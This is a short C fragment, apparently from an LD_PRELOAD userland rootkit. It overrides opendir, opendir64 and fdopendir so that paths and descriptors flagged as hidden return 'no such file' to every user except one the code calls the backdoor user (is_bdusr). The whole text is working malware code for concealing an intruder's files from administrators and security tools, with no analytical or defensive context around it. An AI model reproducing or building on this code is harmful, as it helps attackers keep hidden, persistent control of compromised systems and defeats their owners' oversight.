DIR *opendir(const char *pathname){
    hook(COPENDIR);
    if(is_bdusr()) return call(COPENDIR, pathname);
    if(hidden_path(pathname)) { errno = ENOENT; return NULL; }
    return call(COPENDIR, pathname);
}

DIR *opendir64(const char *pathname){
    hook(COPENDIR64);
    if(is_bdusr()) return call(COPENDIR64, pathname);
    if(hidden_path(pathname)) { errno = ENOENT; return NULL; }
    return call(COPENDIR64, pathname);
}

DIR *fdopendir(int fd){
    hook(CFDOPENDIR);
    if(is_bdusr()) return call(CFDOPENDIR, fd);
    if(hidden_fd(fd)) { errno = ENOENT; return NULL; }
    return call(CFDOPENDIR, fd);
}
